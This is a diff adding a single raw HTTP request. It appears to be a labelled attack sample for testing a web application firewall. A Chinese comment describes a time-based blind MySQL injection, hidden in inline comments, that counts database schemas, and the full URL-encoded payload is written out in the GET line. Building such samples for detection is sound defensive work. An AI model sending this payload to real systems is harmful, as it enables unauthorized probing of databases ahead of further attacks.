@@ -1,0 +1,9 @@
+# SQL注入_GET_mysql_判断数据库数量(内联注释)
+# 基于延时注入,将"if((select count(schema_name) from information_schema.schemata)>4,sleep(3),0)"语句注入到 SQL 查询参数中。攻击者尝试利用子查询来查询数据库中模式的数量，如果模式数量大于4，则使用sleep(3)函数引入延迟3秒；否则返回0。通过观察查询是否延迟执行，攻击者可以得知目标数据库中模式的数量。该sql注入语句，攻击的目的是获取关于数据库结构的敏感信息并进行后续攻击。
+GET /?id=1%20and%20%2F%2A%21if%28%28select%20count%28schema_name%29%20from%20information_schema.schemata%29%3E4%2Csleep%283%29%2C0%29%2A%2F&bid=hd_tag_m8mv26hn HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv26hn
+RM-PRO-Token: ddf37664c8c8ee6f2fe5081af00276ec
+RM-PRO-Time: 1742808619559
+User-Agent: curl/7.83.1
+
